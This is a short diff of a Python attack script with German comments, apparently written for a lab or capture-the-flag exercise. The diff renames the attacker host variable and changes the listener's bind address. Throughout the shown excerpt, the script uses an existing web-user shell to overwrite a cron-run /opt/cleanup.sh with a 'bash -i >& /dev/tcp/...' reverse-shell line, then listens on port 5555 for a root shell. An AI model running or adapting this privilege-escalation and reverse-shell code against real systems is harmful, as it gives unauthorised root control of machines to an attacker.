@@ -7,8 +7,8 @@ import time
 # =============================================================================
 
 # Wird später aus config.py importiert mit:
-# from config import KALI_IP, PORT_ROOT, CLEANUP_SCRIPT
-KALI_IP = "0.0.0.0"
+# from config import KALI_HOST, PORT_ROOT, CLEANUP_SCRIPT
+KALI_HOST = "kali"       # Hostname/IP used both in the payload and (when appropriate) for binding
 PORT_ROOT = 5555
 CLEANUP_SCRIPT = "/opt/cleanup.sh"
 
@@ -34,7 +34,7 @@ def run(www_shell):
     # damit Root-Shell nicht verloren geht
     root_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     root_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    root_server.bind((KALI_IP, PORT_ROOT))
+    root_server.bind(("0.0.0.0", PORT_ROOT))
     root_server.listen(1)
     print(f"[*] Warte auf Root-Shell auf Port {PORT_ROOT}...")
 
@@ -42,7 +42,7 @@ def run(www_shell):
     # > überschreibt, >> hängt an
     print("[*] Überschreibe cleanup.sh...")
     send_command(www_shell, f"echo '#!/bin/bash' > {CLEANUP_SCRIPT}")
-    send_command(www_shell, f"echo 'bash -i >& /dev/tcp/kali/{PORT_ROOT} 0>&1' >> {CLEANUP_SCRIPT}")
+    send_command(www_shell, f"echo 'bash -i >& /dev/tcp/{KALI_HOST}/{PORT_ROOT} 0>&1' >> {CLEANUP_SCRIPT}")
     print("[+] cleanup.sh erfolgreich überschrieben")
     print("[*] Warte auf Cron-Job (max. 60 Sekunden)...")
 
